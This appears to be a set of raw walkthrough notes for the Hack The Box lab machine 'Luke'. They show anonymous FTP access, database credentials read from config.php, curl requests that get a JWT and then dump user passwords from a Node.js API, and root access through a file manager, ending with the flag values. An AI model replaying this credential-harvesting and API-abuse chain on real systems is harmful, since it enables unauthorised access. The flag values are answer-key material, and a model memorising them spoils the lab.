@@ -1,0 +1,183 @@
+root@kali:~/HTB/Luke# ftp luke.htb
+Connected to luke.htb.
+220 vsFTPd 3.0.3+ (ext.1) ready...
+Name (luke.htb:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+226 Directory send OK.
+ftp> cd webapp
+250 Directory successfully changed.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
+226 Directory send OK.
+ftp> get for_Chihiro.txt
+local: for_Chihiro.txt remote: for_Chihiro.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
+226 Transfer complete.
+306 bytes received in 0.00 secs (1.3086 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
+226 Directory send OK.
+ftp> cd ..
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+226 Directory send OK.
+ftp> pwd
+257 "/" is the current directory
+ftp> cd /home
+550 Failed to change directory.
+ftp> exit
+221 Goodbye.
+
+
+creds at /config.php port 80
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 
+
+
+
+
+
+
+
+Node.js request Auth token
+
+curl --header 'Content-Type: application/json' \--request POST \--data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' \http://luke.htb:3000/login
+
+
+
+
+root@kali:~/HTB/Luke# curl --header 'Content-Type: application/json' \--request POST \--data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' \http://luke.htb:3000/login
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5OTk5Nzg4LCJleHAiOjE1NjAwODYxODh9.IVHQeLkzaNopXsA0G3YcfyMHJeFVXtcNr2pbHrK46zA"}
+
+
+root@kali:~/HTB/Luke# curl -X GET \-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwMDAwNTcxLCJleHAiOjE1NjAwODY5NzF9.USKDtvMa1_Z3uEHar4drtzgUCHliACzrvIJmFKr4Ef4' \http://luke.htb:3000/users
+[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
+
+
+
+root@kali:~/HTB/Luke# curl -X GET \-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwMDAwNTcxLCJleHAiOjE1NjAwODY5NzF9.USKDtvMa1_Z3uEHar4drtzgUCHliACzrvIJmFKr4Ef4' \http://luke.htb:3000/users/Admin
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+root@kali:~/HTB/Luke# curl -X GET \-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwMDAwNTcxLCJleHAiOjE1NjAwODY5NzF9.USKDtvMa1_Z3uEHar4drtzgUCHliACzrvIJmFKr4Ef4' \http://luke.htb:3000/users/Derry
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+root@kali:~/HTB/Luke# curl -X GET \-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwMDAwNTcxLCJleHAiOjE1NjAwODY5NzF9.USKDtvMa1_Z3uEHar4drtzgUCHliACzrvIJmFKr4Ef4' \http://luke.htb:3000/users/Yuri
+{"name":"Yuri","password":"bet@tester87"}
+root@kali:~/HTB/Luke# curl -X GET \-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwMDAwNTcxLCJleHAiOjE1NjAwODY5NzF9.USKDtvMa1_Z3uEHar4drtzgUCHliACzrvIJmFKr4Ef4' \http://luke.htb:3000/users/Dory
+{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+
+
+Derry got access to /management with his pass
+
+
+
+http://luke.htb/management/config.json
+has creds
+
+username: "root"
+password: "KpMasng6S5EtTy9Z"
+
+
+access to File manager(root.txt) via port 8000
+
+/root/root.txt: 8448343028fadde1e2a1b0a44d01e650
+
+/home/derry/user.txt: 58d441e500e8941f9cf3baa499e2e4da
+
+
+and a terminal
+
+Bad -c option                                                                                                                                                   
+
+# ls -a
+
+ 
+
+                                                                                                                                                        
+
+.              .profile        COPYRIGHT       dev             home            media           nodeapp         root            tmp                              
+
+..             .snap           bin             entropy         lib             mnt             proc            sbin            usr                              
+
+.cshrc         .sujournal      boot            etc             libexec         net             rescue          sys             var                              
+
+# cd root
+
+ 
+
+                                                                                                                                                      
+
+# ls -a
+
+ 
+
+                                                                                                                                                        
+
+.                      .config                 .k5login                .node_repl_history      .wget-hsts                                                       
+
+..                     .cshrc                  .login                  .npm                    root.txt                                                         
+
+.cache                 .history                .mysql_history          .profile                                                                                 
+
+# cat root.txt
+
+ 
+
+                                                                                                                                                 
+
+8448343028fadde1e2a1b0a44d01e650                                                                                                                                
+
+# cd /home
+
+ 
+
+                                                                                                                                                     
+
+# ls -a
+
+ 
+
+                                                                                                                                                        
+
+.      ..      derry                                                                                                                                            
+
+# cd derry
+
+ 
+
+                                                                                                                                                     
+
+# ls -a
+
+ 
+
+                                                                                                                                                        
+
+.              ..              .cshrc          .login          .login_conf     .mail_aliases   .mailrc         .profile        .shrc           user.txt         
+
+# cat user.txt
+
+ 
+
+                                                                                                                                                 
+
+58d441e500e8941f9cf3baa499e2e4da                                                                                                                                
+
+# 
+
+ 
+
+                                                                                                                                                             
